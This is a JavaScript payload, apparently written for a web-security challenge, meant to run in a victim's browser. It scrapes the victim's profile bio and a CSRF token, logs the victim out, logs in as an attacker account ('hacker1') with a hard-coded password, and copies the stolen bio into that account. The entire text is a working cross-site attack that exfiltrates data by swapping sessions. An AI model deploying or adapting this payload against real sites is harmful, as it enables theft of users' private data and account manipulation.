/* start with retrieving the bio of the catcher account */
fetch("/")
    .then(d => d.text())
    .then(t => {
        var start = t.search('"Bio">') + 6;
        var end = t.search('</textarea>');
        window.bio = t.substring(start, end);
        console.log(window.bio);

        var start = t.search('csrf_token" value="') + 19;
        t = t.substring(start);
        var end = t.search('"');
        var csrf = t.substring(0, end);

        /* then we logout */
        return fetch("/api/user/logout", { method: "POST", body: new URLSearchParams({ csrf_token: csrf }) });

    })
    .then(d => {
        /* now we login as hacker1 */
        return fetch("/")
    })

    .then(d => d.text())
    .then(t => {
        var start = t.search('csrf_token" value="') + 19;
        t = t.substring(start);
        var end = t.search('"');
        var csrf = t.substring(0, end);

        console.log(csrf);

        return fetch("/api/user/login", { method: "POST", body: new URLSearchParams({ csrf_token: csrf, username: "hacker1", password: "hacker123" }) });
    })
    .then(d => d.text())
    .then(d => {
        /* now we login as hacker1 */
        return fetch("/")
    })

    .then(d => d.text())
    .then(t => {
        var start = t.search('csrf_token" value="') + 19;
        t = t.substring(start);
        var end = t.search('"');
        var csrf = t.substring(0, end);

        console.log(csrf);

        return fetch("/api/user/update", { method: "POST", body: new URLSearchParams({ csrf_token: csrf, bio: window.bio}) });
    })
    .then(d => d.text())
    .then(t => console.log(t));
